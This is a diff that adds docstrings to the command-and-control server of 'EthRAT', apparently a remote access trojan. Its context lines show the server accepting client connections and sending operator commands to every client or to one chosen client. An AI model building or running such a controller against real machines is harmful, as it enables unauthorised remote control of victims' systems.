@@ -32,6 +32,12 @@ EEEEEEEEEEEEEEEEEEEEEE          ttttttttttt  hhhhhhh     hhhhhhhRRRRRRRR     RRR
     """ + Fore.RESET)
 
 def handle_client(client_socket, addr, response_queue):
+    """
+    Handles communication with a connected client.
+    
+    - Receives messages from the client and stores them in a queue.
+    - Detects disconnections and removes the client from the list.
+    """
     clients[addr] = client_socket
     if os.name == "nt":
         ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")
@@ -52,6 +58,9 @@ def handle_client(client_socket, addr, response_queue):
         del clients[addr]
 
 def accept_clients(server, response_queue):
+    """
+    Accepts incoming client connections and starts a new thread for each client.
+    """
     while not shutdown:
         try:
             client_socket, addr = server.accept()
@@ -63,6 +72,9 @@ def accept_clients(server, response_queue):
             break
 
 def start_server(lhost, lport):
+    """
+    Starts the server, listens for connections, and handles client interactions.
+    """
     global shutdown
 
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -107,6 +119,7 @@ def start_server(lhost, lport):
 
 
         if choice == -1:
+            """Broadcast a command to all connected clients."""
             while True:
                 command = input("Enter command to send (broadcast): ")
                 if command.lower() == "back":
@@ -126,6 +139,7 @@ def start_server(lhost, lport):
                         print(f"\n{Fore.RED}[!]{Fore.RESET} Timeout waiting for responses from some clients.")
                         break
         elif 0 <= choice < len(clients):
+            """Send a command to a specific client."""
             target_addr = list(clients.keys())[choice]
             print(f"\n{Fore.YELLOW}[*]{Fore.RESET} Interacting with {target_addr[0]}")
             
